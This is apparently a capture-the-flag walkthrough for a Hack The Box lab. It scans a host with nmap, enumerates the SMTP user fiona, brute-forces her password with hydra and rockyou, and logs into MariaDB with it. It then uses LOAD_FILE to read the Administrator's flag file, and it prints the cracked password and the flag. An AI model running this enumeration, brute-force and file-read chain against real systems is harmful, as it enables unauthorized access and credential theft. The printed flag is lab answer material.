````
## Port Scan

sudo nmap -v -sV -Pn -T5 10.129.183.68
````



```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
25/tcp   open  smtp          hMailServer smtpd
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
443/tcp  open  https
587/tcp  open  smtp          hMailServer smtpd
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

Several ports are open, including **SMTP (Port 25)**, so we will proceed with user enumeration.

## User Enumeration

We will use `smtp-user-enum` to identify valid users via the SMTP service:


```
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
```



```
Starting smtp-user-enum v1.2 ( [http://pentestmonkey.net/tools/smtp-user-enum](http://pentestmonkey.net/tools/smtp-user-enum) )
----------------------------------------------------------
|                   Scan Information                       |
----------------------------------------------------------
Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Tue Apr 30 15:35:33 2024 #########
10.129.183.68: fiona@inlanefreight.htb exists
######## Scan completed at Tue Apr 30 15:36:22 2024 #########
1 results.
```

We found one valid SMTP user: `fiona@inlanefreight.htb`

## Brute Force Attack

We will run a dictionary attack against the SMTP service using `hydra` to crack Fiona's password:


```
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.203.7 smtp
```



```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2024-04-30 17:58:46

[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking smtp://10.129.203.7:25/
[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
[STATUS] attack finished for 10.129.203.7 (valid pair found)
```

**Success!** Valid credentials found:

- **User:** `fiona@inlanefreight.htb`
    
- **Password:** `987654321`
    

## MySQL Database Connection

Since **MySQL (Port 3306)** is open, we can try to authenticate using Fiona's credentials to check for sensitive data or lateral movement opportunities:



```
mysql -u fiona -p -h 10.129.203.7 --skip-ssl
```



```
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema || mysql              || performance_schema || phpmyadmin         || test               |+--------------------+
5 rows in set (0,072 sec)
```

We successfully authenticated to the database. After enumerating all available databases, no relevant data or custom tables were found.

### Local File Inclusion (LFI) / Arbitrary File Read

Since we have a valid database session on a Windows host, we will attempt to leverage the `LOAD_FILE` function to read the flag directly from the Administrator's desktop:



```
MariaDB [(none)]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```



```
+------------------------------------------------------+
| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
+------------------------------------------------------+
| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
+------------------------------------------------------+
1 row in set (2 min 3,125 sec)
```